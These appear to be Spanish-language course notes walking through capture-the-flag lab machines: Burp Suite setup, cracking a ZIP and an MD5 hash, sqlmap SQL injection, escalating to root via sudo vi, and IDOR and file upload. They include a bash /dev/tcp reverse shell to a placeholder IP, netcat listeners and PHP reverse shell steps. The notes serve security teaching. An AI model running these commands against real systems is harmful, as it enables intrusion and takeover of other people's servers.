- Título: Burp (o cualquier nombre)
    
- Host: 127.0.0.1
    
- Puerto: 8080
    
- Guardar
    

**Certificado de Burp Suite:** sin él, las páginas HTTPS no cargan. Con FoxyProxy activado y Burp abierto, navegar a:

```
http://burpsuite
```

Descargar el certificado CA, ir a Settings del navegador → Certificates → View → Import, marcar las dos casillas de confianza y aceptar. Solo hay que hacerlo una vez.

Lo que hace Burp es ponerse como intermediario entre el navegador y el servidor. Cuando Intercept está activado, las peticiones quedan capturadas antes de llegar al servidor y se pueden modificar. Si está desactivado, las peticiones pasan directamente pero quedan registradas en HTTP History. Esto es útil para ver todo lo que hace una web por debajo: qué parámetros envía, a qué endpoints, con qué cookies.

- **La idea clave:** las validaciones del frontend (que un campo solo acepte números, que solo se puedan subir JPGs) no tienen ningún valor de seguridad si el backend no las valida también. Burp permite interceptar y modificar la petición antes de que llegue al servidor, bypasseando cualquier control del lado del cliente

**Repaso: Webshell vs Reverse Shell**

La diferencia entre ambas es dónde se ejecutan los comandos:

- **Webshell:** se sube un fichero PHP al servidor. Al accederlo desde el navegador, los comandos se ejecutan en el propio servidor. La interacción se hace desde la URL con un parámetro como ?cmd=id
    
- **Reverse shell:** también se sube un fichero PHP, pero en vez de esperar comandos desde el navegador, el servidor establece una conexión saliente hacia nuestra máquina. Nosotros ponemos un puerto a la escucha con Netcat y el servidor se conecta a nosotros
    

```
# Escuchar en nuestra máquina
nc -lvnp 4444

# El PHP de reverse shell apunta a nuestra IP y puerto
# Al cargarlo en el navegador, la conexión llega aquí
```

Las reverse shells de PHP están disponibles en Kali en /usr/share/webshells/php/. Solo hay que editar la IP y el puerto:

```
cp /usr/share/webshells/php/php-reverse-shell.php .
# Editar: $ip = 'NUESTRA_IP'; $port = 4444;
```

La reverse shell obtiene el usuario www-data porque es el usuario del servicio web. Desde ahí comienza la escalada de privilegios.

**Máquina Appointment — SQLi, ZIP, hash y escalada con vi**

El escaneo Nmap con -sC -sV revela FTP en el puerto 21 con sesión anónima permitida, que contiene un [backup.zip](http://backup.zip/) protegido con contraseña. El puerto 80 tiene un login PHP.

**Rompiendo el ZIP con zip2john y John:**

```
zip2john backup.zip > romper.txt
john romper.txt --wordlist=/usr/share/wordlists/rockyou.txt
john --show romper.txt
```

El ZIP contiene index.php con el código fuente del login. En el PHP se ve que la contraseña se almacena como MD5. El hash se puede romper directamente en [crackstation.net](http://crackstation.net/) o con John:

```
echo "HASH_MD5" > hash.txt
john hash.txt --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt
```

La contraseña obtenida es qwerty789. El usuario del código era admin. Acceso al panel conseguido.

**SQL Injection con SQLMap:**

Una vez dentro, el buscador del panel tiene un campo vulnerable. Al introducir una comilla simple aparece un error que muestra la query SQL interna. Esto confirma una SQL Injection basada en error.

Como el panel requiere autenticación, SQLMap necesita la cookie de sesión. Se obtiene desde el inspector del navegador: Storage → Cookies → valor del PHPSESSID:

```
sqlmap -u "http://IP/dashboard.php?search=test" --cookie="PHPSESSID=VALOR" --os-shell
```

SQLMap prueba automáticamente múltiples técnicas de inyección hasta conseguir una shell como postgres, el usuario de servicio de la base de datos.

**Mejorando la shell con bash:**

La shell de SQLMap es inestable. Para estabilizarla se lanza una reverse shell desde dentro:

```
bash -c 'bash -i >& /dev/tcp/NUESTRA_IP/4445 0>&1'
```

Con Netcat escuchando en el puerto 4445, la conexión llega con una shell más cómoda.

**Escalada de privilegios con vi:**

```
sudo -l
```

Devuelve que el usuario postgres puede ejecutar /bin/vi /etc/postgresql/11/main/postgresql.conf como root sin contraseña. Esto es suficiente para escalar. Siguiendo la lógica de GTFOBins:

```
sudo /bin/vi /etc/postgresql/11/main/postgresql.conf
# Dentro de vi:
:set shell=/bin/bash
:shell
```

Esto abre una shell como root. La flag final está en /root/root.txt.

- **La idea clave:** sudo -l es el primer comando que se lanza al comprometer cualquier cuenta. Si devuelve un binario ejecutable como root, GTFOBins ([gtfobins.github.io](http://gtfobins.github.io/)) muestra cómo abusar de ese binario para escalar privilegios. El patrón es siempre el mismo: el binario tiene permiso de ejecutarse como root, y nosotros tenemos permiso de ejecutarlo

**Introducción a la tercera máquina — IDOR y File Upload**

La clase cierra con una introducción a la siguiente máquina del Tier 2, que introduce dos vulnerabilidades nuevas.

**IDOR (Insecure Direct Object Reference):** la URL contiene un parámetro de ID, por ejemplo ?id=2. Al cambiarlo a ?id=1 se obtiene información de otro usuario, en este caso del administrador. Esto permite robar la cookie del administrador y usarla para autenticarse como él cambiando el valor en el Storage del navegador.

**File Upload:** una vez autenticados como administrador, aparece un panel de subida de ficheros. Si el servidor interpreta PHP, subir una webshell o reverse shell PHP y acceder a ella desde el navegador da ejecución de código. La ruta de subida se puede descubrir con Feroxbuster si no está visible.

- **La metáfora útil:** IDOR es como una taquilla numerada en un vestuario donde la llave del número 2 también abre la del número 1. El sistema asume que nadie va a intentar un número diferente al suyo, pero no lo verifica
